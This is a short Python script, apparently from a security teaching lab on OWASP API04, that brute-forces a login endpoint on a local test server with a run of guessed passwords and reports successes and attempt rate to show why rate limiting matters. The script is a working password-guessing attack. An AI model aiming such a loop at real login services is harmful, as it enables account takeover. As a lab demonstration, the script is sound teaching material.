#!/usr/bin/env python3
"""
API04 Unrestricted Resource Consumption - Login Brute Force Attack
Educational demonstration of how lack of rate limiting enables brute force attacks.
"""

import requests
import time

API_URL = "http://localhost:5004"

def brute_force_login(email, password_attempts=100):
    """Brute force login endpoint"""
    print(f"Attempting {password_attempts} login attempts for {email}...")
    print("Without rate limiting, all attempts will be processed.\n")
    
    start_time = time.time()
    successful = 0
    
    for i in range(password_attempts):
        response = requests.post(
            f"{API_URL}/api/login",
            json={
                "email": email,
                "password": f"password{i}"
            }
        )
        
        if response.status_code == 200:
            successful += 1
            print(f"  Attempt {i}: SUCCESS! Password: password{i}")
        
        if i % 10 == 0 and i > 0:
            print(f"  Completed {i} attempts...")
    
    duration = time.time() - start_time
    
    print(f"\nResults:")
    print(f"  Total attempts: {password_attempts}")
    print(f"  Successful: {successful}")
    print(f"  Time taken: {duration:.2f}s")
    print(f"  Rate: {password_attempts/duration:.2f} attempts/sec")
    print("\nConclusion: Without rate limiting, an attacker can try unlimited passwords!")

if __name__ == '__main__':
    brute_force_login("user1@example.com", password_attempts=50)
